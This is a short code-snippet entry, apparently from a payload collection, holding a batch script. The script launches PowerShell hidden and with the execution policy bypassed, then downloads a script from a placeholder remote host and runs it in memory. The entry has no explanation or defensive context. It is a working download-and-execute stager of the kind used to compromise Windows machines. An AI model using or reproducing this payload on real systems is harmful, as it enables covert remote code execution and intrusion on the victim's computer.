---
id: c740b5d5-3c83-46ff-833a-3ce7f594bb57
type: code
language: Payload
verified: false
created_at: '2020-04-28T21:10:21.094075+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet c740b5d5

**Language**: Payload

```payload
@ECHO OFF
powershell -ep bypass -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
```
